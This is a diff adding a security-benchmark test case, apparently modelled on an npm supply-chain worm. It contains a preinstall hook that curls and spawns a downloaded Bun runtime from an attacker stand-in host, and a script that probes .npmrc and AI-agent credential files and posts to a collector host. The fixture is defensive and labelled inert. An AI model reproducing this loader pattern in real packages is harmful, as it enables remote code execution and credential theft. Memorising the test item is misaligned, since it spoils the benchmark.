@@ -1,0 +1,22 @@
+{
+  "id": "npm-preinstall-bun-chaindrop",
+  "title": "preinstall script downloads Bun and starts a payload that steals tokens",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "package-install",
+  "technique": "package.json runs `node setup.mjs` before install; setup.mjs fetches a Bun release and spawns it on Math_Symbol.js, the payload, which reads AI-agent and registry credentials and posts them.",
+  "trigger": "npm install (preinstall)",
+  "incident": "ChainDrop (Aug 2026): keyv, cacheable and 440 more packages released through the project's own trusted-publishing workflow; tensorlake (Oct 2026) reused the loader",
+  "sources": [
+    "https://www.stepsecurity.io/blog/chaindrop-npm-worm",
+    "https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain"
+  ],
+  "notes": "Bun is fetched from a reserved .invalid mirror and the payload only posts the canary marker.",
+  "files": {
+    "package.json": "{\n  \"name\": \"cache-lite\",\n  \"version\": \"6.0.0\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"preinstall\": \"node setup.mjs\"\n  }\n}\n",
+    "setup.mjs": "import { execSync, spawnSync } from 'node:child_process';\nimport { tmpdir } from 'node:os';\nconst dir = tmpdir() + '/.bun-runtime';\nexecSync(`curl -fsSL https://bun-mirror.attacker.invalid/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip -o ${dir}.zip && unzip -qo ${dir}.zip -d ${dir}`);\nspawnSync(dir + '/bun', ['Math_Symbol.js'], { stdio: 'ignore', detached: true });\n",
+    "Math_Symbol.js": "// PAH-CANARY benchmark fixture -- inert stand-in for a token stealer.\n// Real malware reads AI-agent and registry credentials and posts them; this only sends the canary marker.\nconst fs = require('fs'); const os = require('os'); const https = require('https');\nconst paths = ['.npmrc', '.codex/auth.json', '.claude/.credentials.json'].map((p) => os.homedir() + '/' + p);\nconst found = paths.filter((p) => fs.existsSync(p)).length;\nconst req = https.request('https://collector.attacker.invalid/u', { method: 'POST' });\nreq.on('error', () => {});\nreq.write('marker=PAH-CANARY&n=' + found);\nreq.end();\nconsole.log('PAH-CANARY');\n",
+    "index.js": "module.exports = new Map();\n",
+    "README.md": "# cache-lite\n"
+  }
+}
